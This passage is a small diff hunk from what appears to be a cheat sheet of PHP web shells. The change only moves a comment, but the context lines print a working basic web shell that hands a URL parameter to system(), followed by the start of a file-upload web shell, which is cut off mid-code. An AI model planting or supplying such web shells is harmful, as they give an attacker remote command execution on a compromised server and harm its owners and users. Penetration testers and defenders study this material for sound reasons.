@@ -4,8 +4,8 @@ bash:# php -a
 # Basic Web Shell
 <?php echo(system($_GET["cmd"])); ?>
 
-# File Upload Web shell with command execution.
 
+# File Upload Web shell with command execution.
 $phpCode = <<<'EOD'
 <?php
     if (isset($_REQUEST['fupload'])) {
